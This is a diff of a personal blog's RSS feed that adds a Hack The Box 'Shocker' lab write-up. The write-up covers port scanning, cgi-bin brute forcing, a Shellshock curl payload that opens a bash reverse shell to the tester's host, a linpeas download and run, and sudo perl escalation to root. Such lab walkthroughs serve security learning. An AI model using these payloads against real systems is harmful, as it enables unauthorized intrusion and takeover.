@@ -4,8 +4,149 @@
         <link>/posts/</link>
         <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Tue, 26 Oct 2021 18:20:32 +0700</lastBuildDate>
+        <lastBuildDate>Tue, 26 Oct 2021 19:35:16 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Recap HTB: Shocker</title>
+            <link>/posts/recap-htb-shocker/</link>
+            <pubDate>Tue, 26 Oct 2021 19:35:16 +0700</pubDate>
+            
+            <guid>/posts/recap-htb-shocker/</guid>
+            <description>0x0 Intro    Name Values     Machine Name shocker   Difficulty Easy   Retired True   Release Date 1486 Days   Machine IP 10.10.10.56    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.60 --ulimit 10000 -- -sV -sC -A -T5 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.</description>
+            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align:right">Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td style="text-align:right">shocker</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td style="text-align:right">Easy</td>
+</tr>
+<tr>
+<td>Retired</td>
+<td style="text-align:right">True</td>
+</tr>
+<tr>
+<td>Release Date</td>
+<td style="text-align:right">1486 Days</td>
+</tr>
+<tr>
+<td>Machine IP</td>
+<td style="text-align:right">10.10.10.56</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x1-enumeration">0x1 Enumeration</h2>
+<h3 id="nmaprustscan">Nmap/Rustscan</h3>
+<p>Lets start to enumerate the machine first, using this command :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.60 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5
+
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Site doesn<span style="color:#e6db74">&#39;&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+|   <span style="color:#ae81ff">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc<span style="color:#f92672">=</span>
+|   <span style="color:#ae81ff">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+
+</code></pre></div><p>Open port just http server and ssh.</p>
+<h3 id="site-enumeration">Site Enumeration</h3>
+<p>Visit the web and nothing there include source code.</p>
+<p><img src="/img/htbshocker1.png" alt=""></p>
+<p>Even bruteforcing directory, not found usefull result.</p>
+<p>After a while, i try think about the machine name, shocker like bug shellshock in <code>cgi-bin</code> script.
+Try to get <a href="http://shocker.htb/cgi-bin/">http://shocker.htb/cgi-bin/</a> but get forbidden</p>
+<p><img src="img/htbshocker2.png" alt=""></p>
+<p>Knowing this, try to bruteforce that folder :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://shocker.htb/cgi-bin/ -w ~/wordlist/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">125</span> -x cgi,pl,sh
+
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.56/cgi-bin/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">125</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/dito/wordlist/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              cgi,pl,sh
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2021/10/26 19:25:01 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/user.sh              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 118<span style="color:#f92672">]</span>
+
+</code></pre></div><p>Found interesting script <code>user.sh</code></p>
+<p><img src="/img/htbshocker3.png" alt=""></p>
+<h2 id="0x1-exploit-to-user-shell">0x1 Exploit to User Shell</h2>
+<p>Simple curl to make reverse shell :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -H <span style="color:#e6db74">&#39;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.18/9000 0&gt;&amp;1&#39;</span> http://shocker.htb/cgi-bin/user.sh
+
+nc -lnvp <span style="color:#ae81ff">9000</span>
+Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
+Connection received on 10.10.10.56 <span style="color:#ae81ff">36064</span>
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ 
+
+</code></pre></div><p>We got user <code>shelly</code> and flag user.</p>
+<h2 id="0x2-exploit-to-root-shell">0x2 Exploit to Root Shell</h2>
+<p>I use linpeas linux script, and found interesing sudoers</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+<span style="color:#75715e">#local machine</span>
+$ python3 -m http.server <span style="color:#ae81ff">8000</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+10.10.10.56 - - <span style="color:#f92672">[</span>26/Oct/2021 19:30:39<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /linpeas.sh HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+
+<span style="color:#75715e">#server machine</span>
+$ shelly@Shocker:/home/shelly$ cd /tmp
+cd /tmp
+$ shelly@Shocker:/tmp$ wget http://10.10.14.18:8000/linpeas.sh
+--2021-10-26 08:30:24--  http://10.10.14.18:8000/linpeas.sh
+Connecting to 10.10.14.18:8000...
+
+connected.
+HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+Length: <span style="color:#ae81ff">326636</span> <span style="color:#f92672">(</span>319K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/x-sh<span style="color:#f92672">]</span>
+Saving to: <span style="color:#e6db74">&#39;linpeas.sh&#39;</span>
+
+linpeas.sh          100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span> 318.98K   305KB/s    in 1.0s
+
+2021-10-26 08:30:41 <span style="color:#f92672">(</span><span style="color:#ae81ff">305</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;linpeas.sh&#39;</span> saved <span style="color:#f92672">[</span>326636/326636<span style="color:#f92672">]</span>
+
+$ shelly@Shocker:/tmp$
+$ shelly@Shocker:/tmp$ chmod +x linpeas.sh
+$ shelly@Shocker:/tmp$ ./linpeas.sh
+
+User shelly may run the following commands on Shocker:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+
+</code></pre></div><p>So user shelly can run as user root on perl binary, using gtfobin <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a> we can get escalation to root</p>
+<pre tabindex="0"><code>$ shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec &quot;/bin/sh&quot;;'
+sudo /usr/bin/perl -e 'exec &quot;/bin/sh&quot;;'
+ls
+user.sh
+whoami
+root
+</code></pre>]]></content>
+        </item>
         
         <item>
             <title>Recap HTB: Lame</title>
